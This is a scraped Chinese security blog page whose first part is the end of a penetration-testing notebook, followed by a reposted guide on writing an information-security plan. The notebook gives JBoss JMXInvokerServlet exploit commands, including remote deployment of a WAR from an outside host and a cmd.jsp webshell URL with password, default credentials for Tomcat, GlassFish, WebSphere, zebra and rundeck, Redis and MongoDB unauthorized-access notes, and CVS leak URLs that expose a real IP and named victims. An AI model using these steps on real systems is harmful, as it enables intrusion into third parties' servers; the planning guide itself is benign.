<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet" target="_blank" rel="noopener">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSName</p>
<p>Windows 2003</p>
<p><img src="\assets\img\安全运维\file_html_228e2132d6117e7e.png" alt=""></p>
<p>查看系统版本</p>
<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet" target="_blank" rel="noopener">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> get jboss.system:type=ServerInfo OSVersion</p>
<p><img src="\assets\img\安全运维\file_html_520647a32422e3a2.png" alt=""></p>
<p>远程部署war包（失败）</p>
<p>C:\Users\Aerfa&gt;java -jar c:/jboss_exploit_fat.jar -i<br><a href="http://yy.yy.yy.yy/invoker/JMXInvokerServlet" target="_blank" rel="noopener">http://yy.yy.yy.yy/invoker/JMXInvokerServlet</a> invoke jboss.system:service=MainDeployer deploy<br><a href="http://p2j.cn/is.war" target="_blank" rel="noopener">http://p2j.cn/is.war</a></p>
<p><img src="\assets\img\安全运维\file_html_f6f6157ae371b472.png" alt=""></p>
<p><a href="http://ts-spsoft.sgst.cn/is/?cmd.jsp?pwd=023&amp;cmd=ls" target="_blank" rel="noopener">http://yy.yy.yy.yy/is/?cmd.jsp?pwd=023&amp;cmd=ls</a><br>访问shell是失败</p>
<p><img src="\assets\img\安全运维\file_html_9f1eec4d60316f17.png" alt=""></p>
<h1 id="25-测试机外网可访问"><a href="#25-测试机外网可访问" class="headerlink" title="25 测试机外网可访问 "></a>25 测试机外网可访问 </h1><p>测试机处于外网环境内，存在很多安全问题。比如wooyun案例中的弱口令、java环境管理软件未授权访问、…..<br>此部分不好做归纳，故略过。</p>
<h1 id="26-padding-oracle-attack"><a href="#26-padding-oracle-attack" class="headerlink" title="26 padding oracle attack "></a>26 padding oracle attack </h1><h2 id="26-1-基础知识"><a href="#26-1-基础知识" class="headerlink" title="26.1 基础知识 "></a>26.1 基础知识 </h2><p>Padding指数据“填充”</p>
<p>对于<a href="http://baike.baidu.com/view/155969.htm" target="_blank" rel="noopener">加密算法</a>来说，它们是基于等长的“<a href="http://baike.baidu.com/view/702806.htm" target="_blank" rel="noopener">数据块</a>”进行操作的（如对于RC2，DES或TripleDES算法来说这个长度是8字节(<a href="http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS" target="_blank" rel="noopener">http://baike.baidu.com/view/60408.htm)，而对于Rijndael算法来说则是16、24或32字节）。但是，我们的输入数据长度是不规则的，因此必然需要进行“填充(http://baike.baidu.com/view/542735.htm)”才能形成完整的“块”。“填充”时比较常用的是PKCS</a><br>#5规则，简单地说，便是根据最后一个数据块(<a href="http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。" target="_blank" rel="noopener">http://baike.baidu.com/view/702806.htm)所缺少的长度来选择填充的内容。</a></p>
<h2 id="26-2-漏洞利用"><a href="#26-2-漏洞利用" class="headerlink" title="26.2 漏洞利用 "></a>26.2 漏洞利用 </h2><p>略过，乌云上有案例。</p>
<h1 id="27-tomcat弱口令"><a href="#27-tomcat弱口令" class="headerlink" title="27 tomcat弱口令 "></a>27 tomcat弱口令 </h1><h2 id="27-1-基础知识"><a href="#27-1-基础知识" class="headerlink" title="27.1 基础知识 "></a>27.1 基础知识 </h2><p>不再提及。</p>
<h2 id="27-2-漏洞利用"><a href="#27-2-漏洞利用" class="headerlink" title="27.2 漏洞利用 "></a>27.2 漏洞利用 </h2><p>弱密码：</p>
<p><a href="http://www.xxxx.com:8080/manager/html" target="_blank" rel="noopener">http://www.xxxx.com:8080/manager/html</a> tomcat:tomcat</p>
<p><a href="http://www.xxxx.com:8080/manager/html" target="_blank" rel="noopener">http://www.xxxx.com:8080/manager/html</a> admin:admin</p>
<h1 id="28-phpmyadmin弱口令"><a href="#28-phpmyadmin弱口令" class="headerlink" title="28 phpmyadmin弱口令 "></a>28 phpmyadmin弱口令 </h1><p>略</p>
<h1 id="29-MongoDB配置不当"><a href="#29-MongoDB配置不当" class="headerlink" title="29 MongoDB配置不当 "></a>29 MongoDB配置不当 </h1><p>drops.wooyun.org/papers/850</p>
<h2 id="29-1-基本介绍"><a href="#29-1-基本介绍" class="headerlink" title="29.1 基本介绍 "></a>29.1 基本介绍 </h2><p>略</p>
<h2 id="29-2-未授权访问"><a href="#29-2-未授权访问" class="headerlink" title="29.2 未授权访问 "></a>29.2 未授权访问 </h2><p>默认数据库 admin</p>
<p>用户密码和密码均为空</p>
<p><img src="\assets\img\安全运维\file_html_af31540eed427f60.png" alt=""></p>
<h2 id="29-3-实战演练"><a href="#29-3-实战演练" class="headerlink" title="29.3 实战演练 "></a>29.3 实战演练 </h2><p>yy.yy.yy.yy:27017<br>博苑家_幼儿园教育信息化平台</p>
<p><img src="\assets\img\安全运维\file_html_933d6e56d127adb.png" alt=""></p>
<h1 id="30-各种敏感后台对外开放"><a href="#30-各种敏感后台对外开放" class="headerlink" title="30 各种敏感后台对外开放 "></a>30 各种敏感后台对外开放 </h1><p>一般“奇葩”端口web访问可见。</p>
<h1 id="31-Django配置不当致信息泄露"><a href="#31-Django配置不当致信息泄露" class="headerlink" title="31 Django配置不当致信息泄露 "></a>31 Django配置不当致信息泄露 </h1><p>Django设置debug = True<br>，将报错信息返回至浏览页面，从而导致信息泄露</p>
<h1 id="32-Redis未授权访问"><a href="#32-Redis未授权访问" class="headerlink" title="32 Redis未授权访问 "></a>32 Redis未授权访问 </h1><p>Port: 6379</p>
<p>一般不需要认证，可直接访问</p>
<h2 id="32-1-基础知识"><a href="#32-1-基础知识" class="headerlink" title="32.1 基础知识 "></a>32.1 基础知识 </h2><p>Redis是一个NoSQL的数据库，数据通过键/值对存储在内存中。默认配置中，默认开放没有认证的TCP/6379端口。</p>
<p>和memcached类似，支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)和zset(有序集合)。与memcached不同之处在于，可以随时执行“save”命令将当前redis的数据保存到硬盘，此外redis也会根据配置自动存储数据到硬盘上。</p>
<p>其中RDB就像数据库备份文件</p>
<p>AOF则是一个log日志文件</p>
<h2 id="32-2-利用方式"><a href="#32-2-利用方式" class="headerlink" title="32.2 利用方式 "></a>32.2 利用方式 </h2><ul>
<li>Kali下：</li>
</ul>
<p>redis-cli -h xx.com</p>
<ul>
<li><p>使用软件： Redis Desktop Manager</p>
</li>
<li><p>利用redis未授权访问漏洞getshell【<a href="http://www.secpulse.com/archives/5357.html】" target="_blank" rel="noopener">www.secpulse.com/archives/5357.html】</a></p>
<ul>
<li><p>开启web服务</p>
</li>
<li><p>网站物理路径</p>
</li>
<li><p>www目录可写（root权限）</p>
</li>
</ul>
</li>
</ul>
<h2 id="32-3-实战演练"><a href="#32-3-实战演练" class="headerlink" title="32.3 实战演练 "></a>32.3 实战演练 </h2><p>xx科技有限公司</p>
<p><img src="\assets\img\安全运维\file_html_83a0c3790ea4b0cf.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_f0a10558018436fa.png" alt=""></p>
<p><img src="\assets\img\安全运维\file_html_29c9a47e91a7ef0a.png" alt=""></p>
<h1 id="33-LDAP未授权访问"><a href="#33-LDAP未授权访问" class="headerlink" title="33 LDAP未授权访问 "></a>33 LDAP未授权访问 </h1><p>Port: 389<br>WooYun-2015-92789(<a href="http://www.wooyun.org/bugs/wooyun-2015-092789" target="_blank" rel="noopener">http://www.wooyun.org/bugs/wooyun-2015-092789</a>)</p>
<h2 id="33-1-基础知识"><a href="#33-1-基础知识" class="headerlink" title="33.1 基础知识 "></a>33.1 基础知识 </h2><p>Lightweight Directory Access<br>Protocol，轻量目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p>
<h2 id="33-2-利用方式"><a href="#33-2-利用方式" class="headerlink" title="33.2 利用方式 "></a>33.2 利用方式 </h2><p>使用LDAP Admin进行登陆</p>
<h2 id="33-3-应用实例"><a href="#33-3-应用实例" class="headerlink" title="33.3 应用实例 "></a>33.3 应用实例 </h2><p>zz.zz.zz.zz</p>
<p><img src="\assets\img\安全运维\file_html_63de4b8b96d21dcd.png" alt=""></p>
<h1 id="34-SMB弱口令"><a href="#34-SMB弱口令" class="headerlink" title="34 SMB弱口令 "></a>34 SMB弱口令 </h1><p>Port: 445</p>
<h2 id="34-1-smb字典"><a href="#34-1-smb字典" class="headerlink" title="34.1 smb字典 "></a>34.1 smb字典 </h2><h2 id="34-2-MS08-067溢出"><a href="#34-2-MS08-067溢出" class="headerlink" title="34.2 MS08-067溢出 "></a>34.2 MS08-067溢出 </h2><p><a href="http://www.2cto.com/Article/201308/237265.html" target="_blank" rel="noopener">http://www.2cto.com/Article/201308/237265.html</a></p>
<p>Windows Server<br>服务RPC请求缓冲区溢出漏洞，如果用户在受影响的系统上收到特制的RPC请求，则该漏洞可能允许远程执行代码。在Microsoft<br>Windows 2000 、Windows XP 、Windows<br>Server2003系统上，攻击者可能未经身份即可利用此漏洞运行代码，此漏洞可以形成蠕虫攻击。</p>
<p>Nmap 可以检测目标上是否存在该漏洞：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">namp –sS –A –script=smb-check-vulns –PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span><span class="selector-class">.zz</span></span><br><span class="line"></span><br><span class="line">nmap -sS -A --script=smb-check-vulns -PO zz<span class="selector-class">.zz</span><span class="selector-class">.zz</span><span class="selector-class">.zz</span></span><br></pre></td></tr></table></figure></p>
<p>…….</p>
<h1 id="35-openssl心脏出血"><a href="#35-openssl心脏出血" class="headerlink" title="35 openssl心脏出血 "></a>35 openssl心脏出血 </h1><p>Port：443</p>
<p>Kali桌面以保存python验证脚本</p>
<p>root@Aerfa:~/Desktop# python openssl.py zz.zz.zz.zz</p>
<h1 id="36-squid代理默认端口"><a href="#36-squid代理默认端口" class="headerlink" title="36 squid代理默认端口 "></a>36 squid代理默认端口 </h1><p>Port: 3128</p>
<p>若没有设置口令，则很可能直接漫游内网。</p>
<h1 id="37-GlassFish-web中间件弱口令"><a href="#37-GlassFish-web中间件弱口令" class="headerlink" title="37 GlassFish web中间件弱口令 "></a>37 GlassFish web中间件弱口令 </h1><p>Port: 4848</p>
<p>弱口令：admin / adminadmin</p>
<h1 id="38-PHP-FastCGI远程利用"><a href="#38-PHP-FastCGI远程利用" class="headerlink" title="38 PHP FastCGI远程利用 "></a>38 PHP FastCGI远程利用 </h1><p>Port：9000</p>
<p>zone.wooyun.org/content/1060</p>
<p>使用nmap进行指纹识别： <code>nmap –sV –p 9000
–open zz.zz.zz.zz/24</code></p>
<p>目前遇到poc执行出现问题：invalid header<br>version</p>
<p>（windows 7下未安装goland，<br>kali中已安装仍然出现该问题）</p>
<h1 id="39-elasticsearch代码执行"><a href="#39-elasticsearch代码执行" class="headerlink" title="39 elasticsearch代码执行 "></a>39 elasticsearch代码执行 </h1><p>Port: 9200</p>
<h1 id="40-websphere-web中间件弱口令"><a href="#40-websphere-web中间件弱口令" class="headerlink" title="40 websphere web中间件弱口令 "></a>40 websphere web中间件弱口令 </h1><p>Port: 9043</p>
<p>弱口令：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin / admin</span><br><span class="line"></span><br><span class="line">websphere / websphere</span><br><span class="line"></span><br><span class="line">system / manager</span><br></pre></td></tr></table></figure></p>
<h1 id="41-zebra路由弱密码"><a href="#41-zebra路由弱密码" class="headerlink" title="41 zebra路由弱密码 "></a>41 zebra路由弱密码 </h1><p>Port: 2601,2604</p>
<p>zebra / zebra</p>
<h1 id="42-rundeck-web"><a href="#42-rundeck-web" class="headerlink" title="42 rundeck web "></a>42 rundeck web </h1><p>Port：4440 wooyun-2015-092026</p>
<p>runDeck是用Java/Grails写的开源工具，帮助用户在数据中心或者云环境中自动化各种操作和流程。通过命令行或web界面，用户可以对任意数量的服务器进行操作，大大降低了对服务器自动化的门槛。</p>
<p><a href="http://IP:4440" target="_blank" rel="noopener">http://IP:4440</a> admin / admin</p>
<p><a href="http://IP:4440/menu/home" target="_blank" rel="noopener">http://IP:4440/menu/home</a></p>
<h1 id="43-dns未设置spf导致邮箱欺骗漏洞"><a href="#43-dns未设置spf导致邮箱欺骗漏洞" class="headerlink" title="43 dns未设置spf导致邮箱欺骗漏洞 "></a>43 dns未设置spf导致邮箱欺骗漏洞 </h1><p>nslookup –qt=mx baidu.com</p>
<p>nslookup –qt=txt baidu.com</p>
<h1 id="44-CVS源码泄露"><a href="#44-CVS源码泄露" class="headerlink" title="44 CVS源码泄露 "></a>44 CVS源码泄露 </h1><h2 id="44-1-基础知识"><a href="#44-1-基础知识" class="headerlink" title="44.1 基础知识 "></a>44.1 基础知识 </h2><p>略</p>
<h2 id="44-2-实例应用"><a href="#44-2-实例应用" class="headerlink" title="44.2 实例应用 "></a>44.2 实例应用 </h2><p>zz集团</p>
<p><a href="http://61.152.242.65/bs3q/CVS/Root" target="_blank" rel="noopener">http://yy.yy.yy.yy/bs3q/CVS/Root</a></p>
<p><a href="http://61.152.242.65/cmbs/CVS/Root" target="_blank" rel="noopener">http://yy.yy.yy.yy/cmbs/CVS/Root</a></p>
<p><img src="\assets\img\安全运维\file_html_9f3274155b1132f6.png" alt=""></p>
<p><a href="http://61.152.242.65/cmbs/CVS/Entries" target="_blank" rel="noopener">http://yy.yy.yy.yy/cmbs/CVS/Entries</a></p>
<p><img src="\assets\img\安全运维\file_html_41469a6a25a8a31a.png" alt=""></p>
<h1 id="45-Tomcat-examples-directory漏洞"><a href="#45-Tomcat-examples-directory漏洞" class="headerlink" title="45 Tomcat examples directory漏洞 "></a>45 Tomcat examples directory漏洞 </h1><p><a href="http://61.152.242.65/examples/servlets/servlet/SessionExample" target="_blank" rel="noopener">http://yy.yy.yy.yy/examples/servlets/servlet/SessionExample</a></p>
<p><img src="\assets\img\安全运维\file_html_3a3e383932a1596a.png" alt=""></p>
<p>是否存在sql post注入<br>、session伪造等安全问题。</p>

      

    </div>





    <footer class="article-footer">
      
        <a data-url="http://www.pa55w0rd.club/安全运维那些洞/" data-id="cjop6hb29002uoqt6ke99f42t" class="article-share-link" data-share="baidu" data-title="安全运维那些洞-Aerfa">分享到</a>
      

      
        <a href="http://www.pa55w0rd.club/安全运维那些洞/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>
<!--
<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-->







  
    <article id="post-web应用安全测试备忘录" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/web应用安全测试备忘录/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-29T03:38:20.000Z" itemprop="datePublished">2018-10-29</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/categories/安全建设/">安全建设</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/web应用安全测试备忘录/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>Web应用安全测试备忘录 By legend</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <p><img src="\assets\img\xss\8.png" alt="1"></p>

      

    </div>





    <footer class="article-footer">
      
        <a data-url="http://www.pa55w0rd.club/web应用安全测试备忘录/" data-id="cjop6haw1000uoqt6qv9fsenr" class="article-share-link" data-share="baidu" data-title="Web应用安全测试备忘录 By legend">分享到</a>
      

      
        <a href="http://www.pa55w0rd.club/web应用安全测试备忘录/#gitalk-container" class="article-comment-link">评论</a>
      

      

    </footer>
  </div>
  
</article>
<!--
<div class="share-component" data-disabled="" data-description="Share.js - 一键分享到微博，QQ空间，腾讯微博，人人，豆瓣">一键分享</div>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
-->







  
    <article id="post-信息安全规划文档的编写" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
    <a href="/信息安全规划文档的编写/" class="article-date">
  <i class="fa fa-calendar"></i>
  <time datetime="2018-10-29T03:37:20.000Z" itemprop="datePublished">2018-10-29</time>
</a>

    
  <div class="article-category">
    <a class="article-category-link" href="/categories/安全建设/">安全建设</a>
  </div>


  </div>
  <div class="article-inner">
    
    

      <header class="article-header">

        
  
    <h1 itemprop="name">
      <a class="article-title" href="/信息安全规划文档的编写/">
        <i class="fa fa-pencil-square-o  article-title-icon"></i>信息安全规划文档的编写  （转发）</a>
    </h1>
  



      </header>
    
    <div class="article-entry" itemprop="articleBody">
      

        <br>
        <span id="busuanzi_container_page_pv">
          阅读次数<span id="busuanzi_value_page_pv"></span>
        </span>
        <blockquote>
<p>转自 ：<a href="https://xz.aliyun.com/t/2424" target="_blank" rel="noopener">https://xz.aliyun.com/t/2424</a></p>
</blockquote>
<ul>
<li>目录<br>{:toc}</li>
</ul>
<h2 id="0x00-安全规划的目的"><a href="#0x00-安全规划的目的" class="headerlink" title="0x00 安全规划的目的"></a>0x00 安全规划的目的</h2><p>组织安全部门建立到运行一段的时间，工作阶段从救火到标准化的过程就需要考虑编制和实施适合自己组织的安全规划了。</p>
<p>编写安全规划主要为以后的工作进行合理的估计和安排，从结构上提升组织的安全水平，大概是从杂牌军到正规军的转变，也有可能现有的方法满足不了实际业务的需求，需要重新规划、设计。</p>
<p><img src="\assets\img\xss\7.png" alt="1"></p>
<h2 id="0x01-安全规划应该包含的内容"><a href="#0x01-安全规划应该包含的内容" class="headerlink" title="0x01 安全规划应该包含的内容"></a>0x01 安全规划应该包含的内容</h2><p>安全现状从国际、国内、行业和本组织的安全情况，引出安全需求；需求上分析合规性要求和业务要求，引出安全的整体策略和目标。</p>
<p>用一个房子图描述安全整体规划和保障体系，后面整体描述用什么方法和计划完成这个规划。</p>
<p>安全规划通常包含技术方案和管理方案，要保证方案能够落地再加上安全运行/运营，从传统安全来说，物理安全、网络安全、主机安全、应用安全、数据安全各种技术和管理的措施要到位。</p>
<p>办公网安全和生产网安全区别很大，可以考虑单独分析。</p>
<p>安全规划要提供可供执行、能够落地的工作计划，安全规划通常3年一个周期，缘起计划可以简略，但是需要列出本年度的详细工作计划。</p>
<p>最后是信息安全工作的执行考核和改进。</p>
<h2 id="0x02-如何做好安全规划"><a href="#0x02-如何做好安全规划" class="headerlink" title="0x02 如何做好安全规划"></a>0x02 如何做好安全规划</h2><p>关键的几点：</p>
<ol>
<li>组织内的安全部门有明确的职责和权利，安全部门的活动有组织高层的行动支持；</li>
<li>目标合理，可执行性高；</li>
<li>根据组织安全的实际情况编写，前期做好风险评估、威胁建模、攻击面分析，<strong>防护方案以满足实际需要为主，控制好成本支出</strong>；</li>
<li>管理和技术的安全措施参考 ISO 27001 和等级保护，重点偏安全运行；</li>
<li>一定要有人员的培训和考核，将纸面上的规划落实成实际的效果。</li>
</ol>
<h3 id="管理和技术上的要求"><a href="#管理和技术上的要求" class="headerlink" title="管理和技术上的要求"></a>管理和技术上的要求</h3><p>管理方面参考 ISO 27001 的要求、等级保护的要求行业监管的要求，对策略、规程、标准、流程和记录，选择适用自己组织的管理要求。</p>
<h4 id="技术要求示例"><a href="#技术要求示例" class="headerlink" title="技术要求示例"></a>技术要求示例</h4><p><strong>应用安全</strong></p>
<ul>
<li><p>概述：采用安全技术确保应用系统本身的防护，以及对于应用间数据接口、远程终端的数据访问的安全防护。</p>
</li>
<li><p>范围：</p>
<ul>
<li>Web 容器、中间件、Web 服务器</li>
<li>Web 应用</li>
</ul>
</li>
<li><p>防护目标:</p>
<ul>
<li>通过采取身份认证、访问控制等安全措施，保证系统自身的安全性以及与其他系统数据进行数据交换时所传输数据的安全性。</li>
<li>建立软件安全的输入控制，确保输入数据符合系统设定要求，提供软件自动保护功能，当故障发生时保护自动保护当前所有状态</li>
<li>采取审计措施实施在安全事件发生前发现入侵意图、在安全事件发生时进行告警提示和在安全事件发生后能进行审计追踪。</li>
</ul>
</li>
<li><p>防护要点：</p>
<ul>
<li>身份鉴别：应提供专用的登录控制模块对登录用户进行身份标识和鉴别；应对同一用户采用2种以上的组合鉴别技术实现用户身份鉴别；提供用户身份标识的唯一性和鉴别信息复杂度检查功能；提供登录失败处理功能，可采取结束会话、限制非法登录次数和自动退出等机制；启用软件中的安全功能，并根据安全策略配相关参数。</li>
<li>访问控制：应提供访问控制功能，依据安全策略控制用户对文件、数据库表等客体的访问；应由授权主体配置访问控制策略，并严格限制默认账户的访问权限；应授予不同账户为完成各自承担任务所需的最小权限，并在他们之间形成相互制约的关系；应对有重要信息资源设置敏感标签的功能。应依据安全策略严格控制用户对敏感标记重要信息资源的操作。</li>
<li>安全审计：应提供覆盖到每个用户的安全审计功能，对应用系统重要安全事件进行审计；应确保无法单独终端审计进程，无法删除、修改、覆盖审计记录；应对审计的数据进行统计、查询、分析以及生成审计报表的功能。</li>
<li>剩余信息保护：保证用户鉴别信息所在的存储空间在被释放或重新分配给其他用户之前完全清除，无论在硬盘还是内存中；应保证系统内的文件、目录和数据库记录等资源空间被释放或重新分配给其他用户前得到完全清除。</li>
<li>通信完整性：采用密码技术保证通信过程中数据的完整性。</li>
<li>通信保密性：在通信双方建立连接之前，应用系统利用密码技术进行初始化会话验证；应对通信过程的报文或会话信息过程进行加密。</li>
<li>抗抵赖：应具有在请求的情况下为数据原发者或接收者提供数据原发证据和数据接收证据的功能。</li>
<li>软件容错：应提供数据有效性检验功能，通过人机接口输入或通过通信接口输入的数据格式和长度符合系统的设定要求；应提供自我保护功能，当故障发生时自动保护当前的所有状态，保证系统能够恢复。</li>
<li>资源控制：当应用系统的通信耍弄福冈中等乙方在一段时间内未作任何响应，另一方应能够自动结束会话；应能对系统的最大并发会话连接数和单个账户的多重并发会话进行限制；应能对一个时间段可能的并发会话连接数进行限制；应能对一个访问账户或一个请求进程所申请的资源数进行控制；应能够检测SLA水平，到达预设值时进行告警。</li>
</ul>
</li>
<li><p>防护设备：</p>
<ul>
<li>4A：提供身份识别、认证、访问控制和审核功能。</li>
<li>Web 应用防火墙：提供数据输入验证和审核功能。</li>
<li>网页防篡改</li>
<li>抗 DDoS 设备</li>
<li>Web 漏洞扫描</li>
</ul>
</li>
<li><p>防护技术：</p>
<ul>
<li>4A</li>
<li>代码审计</li>
<li>基线检查和加固</li>
<li>渗透测试</li>
</ul>
</li>
</ul>
<h4 id="管理文档列表（示例）"><a href="#管理文档列表（示例）" class="headerlink" title="管理文档列表（示例）"></a>管理文档列表（示例）</h4><p>等保的文档体系或 ISO 27001 的文档体系，自己找找吧。</p>
<h3 id="安全运行"><a href="#安全运行" class="headerlink" title="安全运行"></a>安全运行</h3><p>购买了安全产品，编写了相关的管理文档，制定了各种工作流程，后面主要的工作就是安全运行/运营，实际上就是用好已有的安全控制措施。</p>
<p>简单以资产管理为例：</p>
<ul>
<li>概述：通过资产管理，确定当前的资产状态，可以快速确认攻击面和某个软件版本缺陷的影响范围。</li>
<li>范围：组织所有 IT 设备，内外网 IP、端口</li>
<li>防护目标：及时发现新启用的 IP 和端口，业务系统所依赖重要的软件和版本的变更。</li>
<li>防护要点：<ul>
<li>结合网络拓扑，对组织内的物理设备和系统进行清查；</li>
<li>梳理组织使用的软件和版本信息，需要确切了解用于支持业务系统的各种软件名称和详细版本；</li>
<li>映射组织的（业务）通信和数据流，确定哪些业务会涉及使用到哪些设备；</li>
<li>资源（例如，硬件，设备，数据和软件）的分类，重要性和商业价值</li>
<li>资产负责人信息、外部供应商信息、外包运维信息。</li>
</ul>
</li>
<li>管理制度和流程<ul>
<li>资产管理制度</li>
<li>业务上线/下线流程</li>
<li>网络端口开放或变更流程</li>
</ul>
</li>
<li>设备或系统支持：<ul>
<li>资产管理系统</li>
<li>IP 端口扫描工具</li>
</ul>
</li>
<li>工作输出：<ul>
<li>当前资产表</li>
<li>IP、端口监控告警历史</li>
</ul>
</li>
</ul>
<h2 id="0x03-安全规划的执行"><a href="#0x03-安全规划的执行" class="headerlink" title="0x03 安全规划的执行"></a>0x03 安全规划的执行</h2><h3 id="人员培训"><a href="#人员培训" class="headerlink" title="人员培训"></a>人员培训</h3><p>整块信息安全工作并不是安全部门自己的事情，需要其他部门的配合，并且增加了其他部门的实际工作量。这就需要以合适的方式让安全部门外的成员理解信息安全工作，获取工作所需要的安全技能，通常是通过培训和考核进行。</p>
<p>这块很重要，通过培训和交流让其他成员支持信息安全工作。</p>
<h3 id="工作任务分解"><a href="#工作任务分解" class="headerlink" title="工作任务分解"></a>工作任务分解</h3><p>根据安全评估了解目前最缺乏的安全措施，那就是最优先需要解决的工作，所以最开始还是梳理资产，评估威胁、漏洞、风险，确认目前急需提升的安全防护措施。</p>
<p>根据现有安全部门组织结构安排工作，涉及部门和人员最少，最有效果的安全措施优先安排，需要其他部门配合的安全措施要与关联部门和人员讨论后进行安排。</p>
<h2 id="0x04-安全规划示例（目录）"><a href="#0x04-安全规划示例（目录）" class="headerlink" title="0x04 安全规划示例（目录）"></a>0x04 安全规划示例（目录）</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">目录</span><br><span class="line">信息安全规划  <span class="number">1</span></span><br><span class="line"><span class="number">1</span>   概述  <span class="number">1</span></span><br><span class="line"><span class="number">1.1</span> 整体安全形势分析    <span class="number">1</span></span><br><span class="line"><span class="number">1.2</span> 行业安全形势分析    <span class="number">1</span></span><br><span class="line"><span class="number">1.3</span> 内部信息安全概况    <span class="number">1</span></span><br><span class="line"><span class="number">2</span>   信息安全需求分析    <span class="number">2</span></span><br><span class="line"><span class="number">2.1</span> 合规性要求   <span class="number">2</span></span><br><span class="line"><span class="number">2.2</span> 集团要求    <span class="number">2</span></span><br><span class="line"><span class="number">2.3</span> 业务需求    <span class="number">2</span></span><br><span class="line"><span class="number">3</span>   信息安全策略和目标   <span class="number">3</span></span><br><span class="line"><span class="number">3.1</span> 信息安全策略  <span class="number">4</span></span><br><span class="line"><span class="number">3.2</span> 信息安全目标  <span class="number">4</span></span><br><span class="line"><span class="number">4</span>   信息安全保障体系    <span class="number">4</span></span><br><span class="line"><span class="number">4.1</span> 设计原则    <span class="number">4</span></span><br><span class="line"><span class="number">4.2</span> 安全建设的层次 <span class="number">3</span></span><br><span class="line"><span class="number">4.3</span> 安全保障体系  <span class="number">5</span></span><br><span class="line"><span class="number">5</span>   信息安全组织和职能   <span class="number">6</span></span><br><span class="line"><span class="number">5.1</span> 安全组织设置  <span class="number">6</span></span><br><span class="line"><span class="number">5.1</span><span class="number">.1</span>   安全协调组织  <span class="number">6</span></span><br><span class="line"><span class="number">5.1</span><span class="number">.2</span>   安全响应中心  <span class="number">6</span></span><br><span class="line"><span class="number">5.1</span><span class="number">.3</span>   各分支机构安全组织   